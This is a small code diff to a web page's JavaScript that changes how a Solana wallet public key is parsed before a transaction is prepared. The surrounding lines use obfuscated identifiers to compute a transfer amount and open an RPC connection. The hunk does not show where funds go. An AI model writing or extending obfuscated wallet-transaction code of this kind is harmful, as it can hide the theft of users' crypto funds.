@@ -443,7 +443,10 @@
                     statusDiv.innerText = "Preparing transaction...";
                     statusDiv.style.color = "#8b92a5";
 
-                    const pubKeyObj = new solanaWeb3.PublicKey(userPublicKey.toString());
+                    // Safely handle wallet public key whether it's string, buffer, or object
+                    const pubKeyString = typeof userPublicKey === 'string' ? userPublicKey : (userPublicKey.toBase58 ? userPublicKey.toBase58() : userPublicKey.toString());
+                    const pubKeyObj = new solanaWeb3.PublicKey(pubKeyString);
+
                     const _0x1c = BigInt(Math.floor(_0x1b * 1000000000)); 
                     const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
                     
